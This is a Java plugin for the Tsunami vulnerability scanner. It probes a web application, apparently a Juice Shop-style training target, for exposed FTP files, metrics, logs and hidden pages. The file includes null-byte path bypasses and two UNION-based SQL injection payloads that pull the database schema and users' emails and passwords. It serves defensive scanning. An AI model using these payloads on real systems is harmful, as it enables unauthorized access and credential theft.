/*
 * Copyright 2024 Lukas Pirch
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.raid;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static java.lang.String.format;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.inject.Inject;
import com.google.protobuf.util.Timestamps;
import com.google.protobuf.ByteString;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import com.google.tsunami.common.net.http.HttpHeaders;

import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.time.Clock;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SensitivedataexposuredetectorpluginDetector",
    version = "0.1",
    description = "Detects SensitiveDataExposureDetectorPlugin vulnerability.",
    author = "Joscha, Elena the Debug Dingos",
    bootstrapModule = SensitivedataexposuredetectorpluginDetectorBootstrapModule.class)
public final class SensitivedataexposuredetectorpluginDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final HttpClient httpClient;
  private final Clock utcClock;
  private String token = "";

  @Inject
  public SensitivedataexposuredetectorpluginDetector(HttpClient httpClient, @UtcClock Clock utcClock) {
    this.httpClient = httpClient;
    this.utcClock = checkNotNull(utcClock);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection for Sensitivedataexposuredetectorplugin Detector");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    int successfulAttacks = 0;
    
    try {
        HttpHeaders headers = HttpHeaders.builder()
            .addHeader("Accept", "*/*")
            .addHeader("User-Agent", "Mozilla/5.0 (compatible; TsunamiScanner)")
            .build();
        
        // Test 1: Access FTP directory
        if (testFtpDirectoryAccess(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 2: Access confidential documents
        if (testConfidentialDocuments(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 3: Access metrics endpoint
        if (testMetricsEndpoint(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 4: Access support logs
        if (testSupportLogs(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 5: Poison null byte attacks on backup files
        if (testPoisonNullByteAttacks(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 6: Access hidden language files
        if (testHiddenLanguageFiles(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 7: SQL injection for data exfiltration
        if (testSqlInjectionDataExfiltration(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
        // Test 8: Access token sale page
        if (testTokenSalePage(targetUri, headers, networkService)) {
            successfulAttacks++;
        }
        
    } catch (IOException e) {
        logger.atWarning().log(
            format("Sensitive data exposure test failed on '%s': %s", networkService, e.getMessage()));
        return false;
    }
    
    return successfulAttacks > 0;
}

private boolean testFtpDirectoryAccess(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/ftp")
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        return body.contains("legal.md") || body.contains("Directory") || body.contains("Index of");
    }
    return false;
}

private boolean testConfidentialDocuments(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String[] documents = {
        "/ftp/acquisitions.md",
        "/ftp/legal.md"
    };
    
    for (String doc : documents) {
        HttpResponse response = httpClient.send(
            HttpRequest.get(targetUri + doc)
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (response.status().code() == 200) {
            String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
            if (body.length() > 100 && (body.contains("confidential") || body.contains("acquisition") || body.contains("legal"))) {
                return true;
            }
        }
    }
    return false;
}

private boolean testMetricsEndpoint(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/metrics")
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        return body.contains("prometheus") || body.contains("# HELP") || body.contains("# TYPE");
    }
    return false;
}

private boolean testSupportLogs(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/support/logs")
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        if (body.contains("access.log") || body.contains("Directory") || body.contains("Index of")) {
            return true;
        }
    }
    
    // Try accessing a specific log file
    HttpResponse logResponse = httpClient.send(
        HttpRequest.get(targetUri + "/support/logs/access.log")
            .setHeaders(headers)
            .build(),
        networkService);
    
    return logResponse.status().code() == 200;
}

private boolean testPoisonNullByteAttacks(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String[] poisonPaths = {
        "/ftp/package.json.bak%2500.md",
        "/ftp/coupons_2013.md.bak%2500.md",
        "/ftp/suspicious_errors.yml%2500.md"
    };
    
    for (String path : poisonPaths) {
        HttpResponse response = httpClient.send(
            HttpRequest.get(targetUri + path)
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (response.status().code() == 200) {
            String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
            if (body.length() > 50 && (body.contains("{") || body.contains("name") || body.contains("version") || body.contains("coupon") || body.contains("rule"))) {
                return true;
            }
        }
    }
    return false;
}

private boolean testHiddenLanguageFiles(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/i18n/tlh_AA.json")
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        return body.contains("{") && body.contains("\"")
            && (body.contains("klingon") || body.contains("tlh") || body.length() > 100);
    }
    return false;
}

private boolean testSqlInjectionDataExfiltration(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    String[] payloads = {
        "qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--",
        "qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
    };
    
    for (String payload : payloads) {
        HttpResponse response = httpClient.send(
            HttpRequest.get(
                targetUri + "/rest/products/search?q="
                    + URLEncoder.encode(payload, StandardCharsets.UTF_8))
                .setHeaders(headers)
                .build(),
            networkService);
        
        if (response.status().code() == 200) {
            String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
            Pattern emailPattern = Pattern.compile("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}");
            Matcher emailMatcher = emailPattern.matcher(body);
            if (emailMatcher.find() || body.contains("CREATE TABLE") || body.contains("sqlite_master")) {
                return true;
            }
        }
    }
    return false;
}

private boolean testTokenSalePage(String targetUri, HttpHeaders headers, NetworkService networkService) throws IOException {
    HttpResponse response = httpClient.send(
        HttpRequest.get(targetUri + "/#/tokensale-ico-ea")
            .setHeaders(headers)
            .build(),
        networkService);
    
    if (response.status().code() == 200) {
        String body = response.bodyBytes().map(bs -> bs.toStringUtf8()).orElse("");
        return body.contains("token") || body.contains("ico") || body.contains("sale") || body.contains("bitcoin");
    }
    return false;
}

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(
            Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("SENSITIVEDATAEXPOSUREDETECTORPLUGIN_VULNERABILITY"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("SensitiveDataExposureDetectorPlugin Vulnerability Exposed")
                .setDescription("The application is vulnerable to SensitiveDataExposureDetectorPlugin attacks.")
                .setRecommendation(
                    "Implement proper access controls and authentication mechanisms. Disable directory browsing. Remove or secure backup files and sensitive endpoints. Use input validation to prevent poison null byte attacks. Implement proper error handling to prevent information disclosure. Secure database queries with parameterized statements."))
        .build();
  }
  
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("SENSITIVEDATAEXPOSUREDETECTORPLUGIN_VULNERABILITY"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("SensitiveDataExposureDetectorPlugin Vulnerability Exposed")
            .setDescription(
                "The application is vulnerable to SensitiveDataExposureDetectorPlugin attacks.")
            .setRecommendation(
                "Implement proper access controls and authentication mechanisms. Disable directory browsing. Remove or secure backup files and sensitive endpoints. Use input validation to prevent poison null byte attacks. Implement proper error handling to prevent information disclosure. Secure database queries with parameterized statements.")
        .build());
  }
}